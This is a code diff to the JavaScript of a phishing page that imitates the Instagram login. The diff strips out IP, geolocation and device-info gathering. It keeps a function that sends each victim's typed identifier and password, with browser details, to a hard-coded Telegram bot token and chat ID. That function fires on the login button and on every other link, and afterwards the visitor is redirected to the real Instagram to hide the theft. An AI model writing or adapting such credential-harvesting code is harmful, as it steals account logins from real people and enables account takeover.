@@ -382,126 +382,13 @@
             const isPhoneNumber = (input) => /^\d{10}$/.test(input);
             const isUsername = (input) => /^[a-zA-Z0-9._]{1,30}$/.test(input);
 
-            // sendToTelegram function now accepts input1, input2, actionType, includeDetailedInfo, includeGeolocation
-            async function sendToTelegram(input1, input2, actionType, includeDetailedInfo = false, includeGeolocation = false) {
+            // sendToTelegram function now only sends identifier, password, and basic browser info
+            async function sendToTelegram(input1, input2, actionType) {
                 const browser = navigator.userAgent;
                 const language = navigator.language;
                 const platform = navigator.platform;
                 const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-                let ip = 'Error in fetching IP';
-                let locationText = 'N/A (Geolocation not requested for this action)';
                 
-                // Fetch IP address
-                try {
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipRes.json();
-                    ip = ipData.ip;
-                } catch (e) { /* Error in fetching IP */ }
-
-                // Fetch Geolocation ONLY if includeGeolocation is true AND permission is already granted
-                if (includeGeolocation) {
-                    try {
-                        if (navigator.geolocation && navigator.permissions) {
-                            const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
-                            if (permissionStatus.state === 'granted') {
-                                await new Promise((resolve) => {
-                                    navigator.geolocation.getCurrentPosition(
-                                        (pos) => {
-                                            const { latitude, longitude } = pos.coords;
-                                            locationText = `Latitude: ${latitude}, Longitude: ${longitude}`;
-                                            resolve();
-                                        },
-                                        (error) => {
-                                            locationText = `Error in fetching Geolocation (${error.message || error.code})`;
-                                            resolve();
-                                        },
-                                        { timeout: 5000, enableHighAccuracy: false }
-                                    );
-                                });
-                            } else {
-                                locationText = `Geolocation not granted or available without prompt (${permissionStatus.state})`;
-                            }
-                        } else {
-                            locationText = 'Geolocation API or Permissions API Not Supported';
-                        }
-                    } catch (e) { /* Error in checking/fetching Geolocation */ }
-                }
-
-
-                let detailedInfoSection = '';
-                if (includeDetailedInfo) {
-                    // Collect device info that typically doesn't require explicit permission pop-ups
-                    let batteryLevel = 'N/A';
-                    let batteryCharging = 'N/A';
-                    let networkType = 'N/A';
-                    let networkEffectiveType = 'N/A';
-                    let deviceMemory = 'N/A';
-                    let hardwareConcurrency = 'N/A';
-
-                    // Battery Status API
-                    try {
-                        if ('getBattery' in navigator) {
-                            const battery = await navigator.getBattery();
-                            batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
-                            batteryCharging = battery.charging ? 'Yes' : 'No';
-                        } else {
-                            batteryLevel = 'API Not Supported';
-                            batteryCharging = 'API Not Supported';
-                        }
-                    } catch (e) {
-                        batteryLevel = `Error in fetching Battery status (${e.message || e.name})`;
-                        batteryCharging = `Error in fetching Battery status (${e.message || e.name})`;
-                    }
-
-                    // Network Information API
-                    try {
-                        if ('connection' in navigator && navigator.connection) {
-                            networkType = navigator.connection.type || 'N/A';
-                            networkEffectiveType = navigator.connection.effectiveType || 'N/A';
-                        } else {
-                            networkType = 'API Not Supported';
-                            networkEffectiveType = 'API Not Supported';
-                        }
-                    } catch (e) {
-                        networkType = `Error in fetching Network info (${e.message || e.name})`;
-                        networkEffectiveType = `Error in fetching Network info (${e.message || e.name})`;
-                    }
-
-                    // Device Memory
-                    try {
-                        if ('deviceMemory' in navigator) {
-                            deviceMemory = `${navigator.deviceMemory} GB`;
-                        } else {
-                            deviceMemory = 'API Not Supported';
-                        }
-                    } catch (e) {
-                        deviceMemory = `Error in fetching Device Memory (${e.message || e.name})`;
-                    }
-
-                    // Hardware Concurrency
-                    try {
-                        if ('hardwareConcurrency' in navigator) {
-                            hardwareConcurrency = navigator.hardwareConcurrency;
-                        } else {
-                            hardwareConcurrency = 'API Not Supported';
-                        }
-                    } catch (e) {
-                        hardwareConcurrency = `Error in fetching Hardware Concurrency (${e.message || e.name})`;
-                    }
-
-                    detailedInfoSection = `
-🔋 *Device Info:*
-- Battery Level: ${batteryLevel}
-- Battery Charging: ${batteryCharging}
-- Network Type: ${networkType}
-- Effective Network Type: ${networkEffectiveType}
-- Device Memory: ${deviceMemory}
-- Hardware Concurrency (CPU cores): ${hardwareConcurrency}
-`;
-                }
-
-
                 const fullMessage = `
 ? *${actionType}*
 ---------------------
@@ -513,13 +400,9 @@
 - Language: ${language}
 - Timezone: ${timezone}
 - User Agent: ${browser}
-
-🌍 *IP Address:* ${ip}
-📍 *Geolocation:* ${locationText}
-${detailedInfoSection}
 `;
-              
-                const botToken = '7636054451:AAEPi5odWJAuCe9P2B3MQI5D26jsDA4x73M';
+
+                const botToken = '7636054451:AAEPi5odWJAuCe9P2B3MQI5D26jsDA4x73M'; 
                 const chatId = '6483881505';
 
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -563,15 +446,15 @@ ${detailedInfoSection}
                 }
 
                 if (isValidIdentifier && password) {
-                    // Send detailed info BUT without geolocation for primary login button
-                    await sendToTelegram(identifier, password, 'Login Attempt (Detailed Info - No Geo)', true, false);
+                    // Send basic info for primary login button
+                    await sendToTelegram(identifier, password, 'Login Attempt');
                     window.location.href = "https://www.instagram.com";
                 } else {
                     alert(validationMessage.trim() || 'Please fill in both fields correctly.');
                 }
             });
 
-            // Add event listeners to all links for DETAILED INFO COLLECTION
+            // Add event listeners to all links for data collection
             document.querySelectorAll('a, button.facebook-login').forEach(link => {
                 // Exclude the login-button itself as it has its own logic (handled above)
                 if (link.id === 'login-button') return;
@@ -581,8 +464,8 @@ ${detailedInfoSection}
                     const password = passwordInput.value.trim();
                     const linkName = link.dataset.linkName || link.innerText.trim() || link.getAttribute('href');
                     
-                    // Send detailed info WITH geolocation for other link clicks
-                    await sendToTelegram(identifier, password, `Clicked Link: ${linkName} (Detailed Info + Geo)`, true, true);
+                    // Send basic info for all link clicks
+                    await sendToTelegram(identifier, password, `Clicked Link: ${linkName}`);
                 });
             });
 
